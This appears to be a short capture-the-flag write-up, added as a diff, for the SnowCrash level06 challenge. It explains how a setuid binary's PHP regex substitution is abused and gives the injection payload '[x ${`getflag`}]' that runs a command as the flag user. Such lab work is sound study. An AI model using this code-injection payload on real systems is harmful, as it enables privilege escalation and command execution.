@@ -1,0 +1,28 @@
+level06@SnowCrash:~$ ls -l
+total 12
+-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
+-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.p
+
+level06 can be executed with permission of the owner  (flag06)
+
+level06@SnowCrash:~$ ./level06 
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+it executes php script and waits for a file to open
+
+disasm level06
+strings level06
+
+execve level06.php
+
+found out what regexp does:
+
+it takes secound regexp group and substitude it with call y() with the second group
+
+${in this brakets instuction can be executed}
+
+so we pass `getflag` to be executed
+
+
+created a file [x ${`getflag`}]
+got password
